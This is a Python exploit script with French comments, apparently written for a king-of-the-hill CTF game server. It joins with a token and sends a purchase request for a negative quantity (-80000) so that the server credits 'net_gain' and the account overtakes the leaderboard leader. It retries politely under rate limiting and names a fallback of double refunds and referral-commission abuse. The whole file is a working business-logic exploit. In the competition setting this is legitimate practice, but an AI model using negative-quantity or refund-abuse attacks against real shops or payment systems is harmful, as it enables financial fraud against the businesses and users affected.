#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : prise de la couronne (net_gain max).

Hypothèse : achat à quantité négative => "dépense" négative => net_gain crédité.
UNE seule requête mutante à grande magnitude doit suffire à dépasser le leader.

Le hill a un rate-limit partagé/erratique : chaque appel est RETENTÉ à cadence
lente jusqu'à passer (pas de flood : 1 tentative / DELAY s, plafond MAX essais).
On ne touche qu'à NOTRE compte.

Si le buy négatif est REFUSÉ (erreur métier, pas 429), le script le dit -> on
bascule sur le plan B (double remboursement / commissions de parrainage).
"""
import json, time, urllib.request, urllib.error
from http.cookiejar import CookieJar

HOST   = "http://13.37.197.230:28493"
TOKEN  = "6eefff4072981996"
QTY    = -80000          # booster=2000 -> ~+160M net_gain (leader ~147M)
DELAY  = 8               # secondes entre deux tentatives sur un appel 429
MAX    = 10              # tentatives max par appel

cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(path, body=None, label=""):
    data = json.dumps(body).encode() if body is not None else None
    for attempt in range(1, MAX + 1):
        req = urllib.request.Request(HOST + path, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST" if body is not None else "GET")
        try:
            with opener.open(req, timeout=8) as r:
                txt = r.read().decode(errors="replace")
                print(f"  {label or path} -> {r.status} {txt[:300]}")
                try: return json.loads(txt)
                except Exception: return {}
        except urllib.error.HTTPError as e:
            body_txt = e.read().decode(errors="replace")
            if e.code == 429:
                print(f"  {label or path} -> 429 (limiteur), retente dans {DELAY}s [{attempt}/{MAX}]")
                time.sleep(DELAY); continue
            print(f"  {label or path} -> {e.code} {body_txt[:300]}")
            return {}
        except Exception as ex:
            print(f"  {label or path} -> erreur {ex}, retente dans {DELAY}s [{attempt}/{MAX}]")
            time.sleep(DELAY); continue
    print(f"  {label or path} -> abandon après {MAX} tentatives (limiteur trop chargé)")
    return {}

print("1) join");       call("/api/join", {"token": TOKEN}, "join")
print("2) baseline");   call("/api/me", label="me(baseline)")
print(f"3) générateur : buy booster qty={QTY}")
call("/api/buy", {"product": "booster", "qty": QTY}, "buy(neg)")
print("4) état après"); me = call("/api/me", label="me(après)")
print("5) classement"); call("/api/leaderboard", label="leaderboard")

print()
if me.get("net_gain", 0) > 147040002:
    print(f"*** COURONNE PRISE : net_gain = {me['net_gain']} > leader 147040002 ***")
else:
    print(f"net_gain actuel = {me.get('net_gain')}. Si le buy négatif a été refusé,")
    print("colle la sortie : on passe au plan B (double refund / parrainage).")
